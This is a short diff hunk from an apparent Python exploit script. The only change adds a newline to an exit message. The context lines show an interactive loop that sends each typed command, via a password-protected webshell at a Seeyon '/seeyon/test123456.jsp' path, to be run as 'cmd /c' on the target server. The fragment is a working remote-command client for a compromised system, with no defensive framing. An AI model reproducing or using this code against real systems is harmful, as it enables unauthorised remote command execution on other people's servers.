@@ -15,7 +15,7 @@ while 1:
     try:
         command = input(">>> ")
     except:
-        print("Bye~ I Love You~~~")
+        print("\nBye~ I Love You~~~")
         sys.exit(1)
     exp_url = url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+" + quote(command)
     req = requests.get(exp_url)
